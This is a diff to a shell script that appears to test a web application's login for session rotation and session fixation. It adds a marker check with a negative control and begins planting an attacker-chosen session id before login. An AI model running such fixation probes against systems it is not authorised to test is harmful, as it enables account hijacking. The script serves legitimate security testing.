@@ -50,7 +50,13 @@ JAR_F=$(mktemp)
 curl -sk -c "$JAR_F" "https://$H/login" -o /dev/null; PRE=$(sess "$JAR_F")
 curl -sk -c "$JAR_F" -b "$JAR_F" -X POST "https://$H/login" -d "username=$U_A&password=$P_A" -o /dev/null
 POST=$(sess "$JAR_F"); [ -n "$PRE" ] && [ "$PRE" = "$POST" ] && echo "NO ROTATION across login"
-curl -sk -H "Cookie: $POST" "$ME" | grep -c "$MARK"      # and it authenticates?
+# MARK must be assigned and asserted - an unset MARK makes `grep "$MARK"` an empty pattern
+# that matches every line, so a logged-out anonymous body would read as "still authenticated".
+MARK=$(curl -sk -H "Cookie: $POST" "$ME" | grep -oE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+' | head -1)
+: "${MARK:?pick an identity string that appears ONLY in an authenticated body}"
+curl -sk -H "Cookie: garbage=1" "$ME" | grep -qF -- "$MARK" \
+  && { echo "MARK appears anonymously - pick another"; false; }   # negative control, mandatory
+curl -sk -H "Cookie: $POST" "$ME" | grep -qF -- "$MARK" && echo "authenticates"
 
 FIX="${A%%=*}=zpfix00000000000000000001"                  # attacker-chosen id
 curl -sk -b "$FIX" -X POST "https://$H/login" -d "username=$U_A&password=$P_A" \
